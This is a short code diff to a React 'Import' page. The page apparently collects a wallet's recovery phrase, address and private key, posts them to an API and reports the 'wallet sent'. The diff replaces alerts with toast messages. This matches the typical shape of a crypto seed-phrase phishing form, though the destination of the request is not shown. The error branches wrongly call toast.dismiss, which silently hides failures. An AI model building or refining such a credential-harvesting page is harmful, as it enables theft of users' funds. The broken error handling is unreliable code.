@@ -2,6 +2,7 @@
 import { ArrowLeft, Key, FileText, Shield, } from "lucide-react";
 import Link from "next/link";
 import { useState } from "react";
+import toast from "react-hot-toast";
 
 const Import = () => {
   const [importing, setImporting] = useState(false);
@@ -32,7 +33,7 @@ const Import = () => {
     });
 
     if (res.ok) {
-      alert(`✅ Wallet sent via ${method}`);
+      toast.success(`✅ Wallet sent via ${method}`);
       setFormData({
         phrase: "",
         address: "",
@@ -41,11 +42,11 @@ const Import = () => {
         privateKey: "",
       });
     } else {
-      alert("❌ Failed to send wallet");
+      toast.dismiss("❌ Failed to send wallet");
     }
   } catch (error) {
     console.error(error);
-    alert("⚠️ Error connecting to API");
+    toast.dismiss("⚠️ Error connecting to API");
   } finally {
     setImporting(false);
   }
